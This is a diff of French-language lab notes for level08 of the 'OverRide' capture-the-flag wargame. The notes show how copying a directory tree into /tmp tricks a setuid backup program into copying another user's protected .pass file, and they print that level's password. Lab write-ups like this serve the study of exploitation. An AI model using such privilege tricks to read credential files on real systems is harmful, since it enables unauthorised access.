@@ -15,3 +15,67 @@ drwxrwx---+ 1 level09 users    60 Oct 19  2016 ./
 dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ../
 -rwxrwx---+ 1 level09 users     0 Oct 19  2016 .log*
 level08@OverRide:~/backups$ cat .log
+
+
+➜  override git:(main) ✗ export level=level08
+➜  override git:(main) ✗ scp -P 4242 $level@192.168.1.28:/home/users/$level/$level ./bin/.
+
+level08@OverRide:~$ ./level08
+Usage: ./level08 filename
+ERROR: Failed to open (null)
+level08@OverRide:~$
+
+
+le programme essaye d'ouvrir:
+- ./backups/.log
+- le fichier donner en argv
+- le fichier donner en argv dans ./backup
+
+
+level08@OverRide:~$ ./level08 .pass
+ERROR: Failed to open ./backups/.pass
+
+level08@OverRide:~$ ll backups/
+total 8
+drwxrwx---+ 1 level09 users    80 Sep 16 09:31 ./
+dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ../
+-rwxrwx---+ 1 level09 users    29 Sep 16 09:45 .log*
+-r--r-----+ 1 level09 users    41 Sep 16 09:31 .pass
+level08@OverRide:~$
+
+> fd = open(dest, 193, 432);
+
+
+O_WRONLY (1) : Ouverture en écriture seule.
+O_CREAT (64) : Crée le fichier s'il n'existe pas.
+O_EXCL (128) : S'assurer que cet appel crée le fichier : 
+ si cet attribut est spécifié en conjonction avec O_CREAT 
+ et si le fichier pathname existe déjà, open() échouera.
+Calcul : 1 + 64 + 128 = 193.
+
+6 (Propriétaire) : Lecture et écriture.
+6 (Groupe) : Lecture et écriture.
+0 (Autres) : Aucun droit.
+
+je ne vois pas pourquoi il ne peut pas creer le fichier
+
+
+level08@OverRide:~$ ln -s /home/users/level09/.pass ./.pad
+ln: failed to create symbolic link `./.pad': Permission denied
+
+	v5 = fopen("./backups/.log", "w");
+on peut recreer une arboressence dans tmp? 
+
+level08@OverRide:~$ cd /tmp/
+level08@OverRide:/tmp$ mkdir backups
+level08@OverRide:/tmp$ mkdir backups/home
+level08@OverRide:/tmp$ mkdir backups/home/users
+level08@OverRide:/tmp$ mkdir backups/home/users/level09
+level08@OverRide:/tmp$ cd backups/
+level08@OverRide:/tmp/backups$ touch .log
+
+level08@OverRide:/tmp$ $HOME/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$
+
+level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
